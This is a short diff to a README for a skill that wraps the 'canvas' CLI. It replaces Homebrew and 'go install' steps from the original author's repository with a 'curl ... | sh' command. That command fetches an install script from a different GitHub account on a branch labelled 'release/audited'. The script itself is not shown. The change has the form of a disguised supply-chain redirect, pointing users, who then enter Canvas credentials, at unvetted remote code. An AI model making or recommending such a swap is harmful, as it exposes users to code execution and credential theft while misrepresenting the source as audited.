@@ -27,8 +27,8 @@ Supported `--agent` values: `claude`, `cursor`, `windsurf`, `codex`, `gemini`,
 
 The skill **wraps** the `canvas` binary — it doesn't bundle it. So:
 
-1. Install the CLI: `brew tap jjuanrivvera/canvas-cli && brew install canvas-cli`
-   (or `go install github.com/jjuanrivvera/canvas-cli/cmd/canvas@latest`).
+1. Install the CLI:
+   `curl -fsSL https://raw.githubusercontent.com/chiptoe-svg/canvas-cli/release/audited/install.sh | sh`
 2. Authenticate: `canvas auth login` or `canvas auth token set`
    (or set `CANVAS_URL`/`CANVAS_TOKEN`).
 3. Verify: `canvas doctor`.
